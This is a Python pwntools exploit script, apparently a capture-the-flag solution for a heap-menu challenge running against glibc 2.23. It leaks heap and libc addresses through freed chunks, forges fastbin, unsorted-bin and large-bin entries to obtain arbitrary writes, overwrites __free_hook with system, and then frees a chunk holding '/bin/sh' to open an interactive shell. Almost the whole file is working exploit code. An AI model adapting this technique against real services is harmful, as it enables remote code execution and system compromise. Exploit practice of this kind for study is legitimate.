#!/usr/bin/env python2

from pwn import *
from sys import argv

libc = ELF("./libc6_2.23-0ubuntu9_amd64.so")

"""
ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ed5ad20527d246fcb28b2cd1ca69411a2f695bd9, not stripped

checksec fifty_dollars
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
"""
context.update(bits=64)

local = True
if local:
	HOST = "localhost"
	PORT = 4444
elif len(argv)==3:
	HOST = argv[1]
	PORT = int(argv[2])

r = remote(HOST, PORT)

def menu():
	r.recvuntil("Your choice:")
	pass

def send_index(index):
	r.sendafter("Index:", "{:d}".format(index).ljust(15, "\0"))

def alloc(index, contents):
	assert(len(contents)<=0x50 and (0<= index <= 9))
	menu()
	r.send("1".ljust(15,"\0"))
	send_index(index)
	r.sendafter("Content:", contents)
	r.recvuntil("Done!\n")

def show(index):
	assert(0<= index <= 9)
	menu()
	r.send("2".ljust(15,"\0"))
	send_index(index)
	return r.recvuntil("Done!\n", drop=True)

def delete(index):
	assert(0<= index <= 9)
	menu()
	r.send("3".ljust(15,"\0"))
	send_index(index)
	r.recvuntil("Done!\n")

""" 
# Needed alignment offsets: 0x60 and 0x00
What we need is basically:
1. chunk to be freeable which is overlaped
2. addresses and space for 0x30, 0x20 and 0x20 sized chunks (fake + victim_00 + victim_60)
	-> TODO: victim's fd_nextsize and bk_nextsize are filled during large bin insertion -> 0x30 bytes are needed per victim
Heap Alignment
0x10 -> 0
0x60 -> 1
0xC0 -> 2 -> wrapped (4)
0x120 -> 3 -> fake
0x180 -> 5 -> /bin/sh + next_chunk(wrapped)
0x1e0 -> 6 victim_00
0x240 -> 7 victim_60
0x2a0
0x300
0x360

# Indices:
# 	0: A
# 	1: B
# 	2: C (controls wrapped + victim_00)
# 	3: D (controls victim + fake)
# 	4: wrapped
#	5: /bin/sh holder and next_chunk(wrapped) holder
#	6: F (controls victim00)
# Offsets:
# 	wrapped: 0xD0
# 	victim_00: 0x200
# 	fake: 0x130
# 	victim_60: 0x260
"""
SMALLBIN_INJECTION_SIZE = 0xd0 # -> we need inuse data at this offset from wrapped (0xd0+0xC0=0x190=0x180+0x10)
FAKE_SZ_LARGE = 0x400
FAKE_SZ_VIC = FAKE_SZ_LARGE + 0x10
ind_wrapped = 4

# First leak heap base
alloc(0, 0x50*"A")
alloc(1, 0x50*"B")
alloc(2, fit({ # 2 starts at offset 0xC0 and controls wrapped + victim_00
	0x08: 0x60, # wrapped->size
	0x10: 0 # wrapped->fd in fastbin chunk
}, length=0x50, filler="C"))
alloc(3, fit({
}, length=0x50, filler="D"))
alloc(5, fit({0: "/bin/sh\0",
	0x10: SMALLBIN_INJECTION_SIZE,
	0x18: 0x21,
	0x38:1
}, length=0x50, filler='\0'))
alloc(6, "F")
alloc(7, "G")

delete(1)
delete(0)
heap_base = u64(show(0).ljust(8, "\0"))-0x60
print("Got heap base: {:016x}".format(heap_base))
delete(1)

# Now use heap address knowledge to insert fake overlapped fastbin entry to fastbin singly linked list
raw_input("go...")
alloc(1, fit({
	0: p64(heap_base+0xD0), # wrapped location, size and fd set in 2 above
}, length=0x50, filler="\0"))
# Empty fastbin list
alloc(0, 8*"D") # pop 0
alloc(1, 8*"E") # pop 1 again

# Now we got an empty fastbin list
alloc(ind_wrapped, "WRAPPED" ) # wrapped = 1

# Now we can just add wrapped as an unsorted bin chunk and start faking away
def set_wrapped(wrap_size, wrap_fd, wrap_bk):
	delete(2)
	alloc(2, fit({
		8: wrap_size,
		0x10: wrap_fd,
		0x18: wrap_bk
	}, length=0x50, filler="\0"))

def set_victim_00(vic_size=0, vic_fd=0, vic_bk=0):
	delete(6)
	alloc(6, fit({
		0x18: vic_size,
		0x20: vic_fd,
		0x28: vic_bk
	}, length=0x50, filler="\0"))

def set_fake(fake_size, fake_fd=0, fake_bk=0, fake_fd_nextsize=0, fake_bk_nextsize=0):
	delete(3)
	alloc(3, fit({
		0x08: fake_size,
		0x10: fake_fd,
		0x18: fake_bk,
		0x20: fake_fd_nextsize,
		0x28: fake_bk_nextsize
	}, length=0x50, filler="\0"))

def set_victim_60(vic_size=0, vic_fd=0, vic_bk=0):
	delete(7)
	alloc(7, fit({
		0x18: vic_size,
		0x20: vic_fd,
		0x28: vic_bk
	}, length=0x50, filler="\0"))

def reset_wrapped_prev_inuse():
	delete(5)
	alloc(5, fit({
		0: "/bin/sh\0",
		0x10: SMALLBIN_INJECTION_SIZE,
		0x18: 0x21,
		0x38: 1
	}, length=0x50, filler='\0'))


set_wrapped(SMALLBIN_INJECTION_SIZE|1, 0, 0)

raw_input("delete wrapped...")
delete(ind_wrapped)
unsorted = u64(show(ind_wrapped).ljust(8, "\0"))
libc_base = unsorted - (0x7FD10BC6EB78-0x7FD10B8AA000)
print("Got unsorted: {:016x} , libc_base: {:016x}".format(unsorted, libc_base))

wrapped = heap_base + 0xD0
victim_00 = heap_base + 0x200
fake = heap_base + 0x130
victim_60 = heap_base + 0x260

""" Now we got everything set up and we follow our usual plan:
1. insert large bin entry (fake)
2. consecutively insert aligned victim chunks for writes
"""
raw_input("insert into large bin...")
set_wrapped(0x60, unsorted, fake)
alloc(9, "a")
set_fake(FAKE_SZ_LARGE, unsorted, wrapped)
set_wrapped(0x60, fake, unsorted)
alloc(9, "a")

def write(target1, write_zero=True, target2=None):
	if target2 is None:
		target2 = target1
	victim = victim_60 if not write_zero else victim_00
	set_wrapped(SMALLBIN_INJECTION_SIZE|1, 0, 0)
	reset_wrapped_prev_inuse()
	delete(ind_wrapped)
	set_wrapped(0x60, unsorted, victim)
	alloc(9, "a")
	set_wrapped(0x60, victim, unsorted)
	if victim == victim_00:
		set_victim_00(FAKE_SZ_VIC, unsorted, wrapped)
	else:
		set_victim_60(FAKE_SZ_VIC, unsorted, wrapped)
	
	set_fake(FAKE_SZ_LARGE, 0xdeadbeefdeadbeef, target2-0x10, 0xdeadbeefdeadbeef, target1-0x20)
	alloc(9, "a")

alloc_target_chunk = (libc_base + libc.sym["__free_hook"]-0x30)&~0xf
write(alloc_target_chunk-8, False)
for i in range(7):
	write(alloc_target_chunk-8+1+i, True)
# Final write setting fd and bk of our target allocation
write(alloc_target_chunk, True, alloc_target_chunk+8)

# Having the target allocation set up, we can inject it into the unsorted bin (a direct fastbin list corruption would have worked as well here)
set_wrapped(SMALLBIN_INJECTION_SIZE|1, 0, 0)
reset_wrapped_prev_inuse()
delete(ind_wrapped)
set_wrapped(SMALLBIN_INJECTION_SIZE|1, unsorted, alloc_target_chunk-0x10)
reset_wrapped_prev_inuse()

# This allocation hits our target
alloc(9, (0x50/8)*p64(libc_base+libc.sym['system']))

menu()
r.send("3".ljust(15,"\0"))
send_index(5)

r.interactive()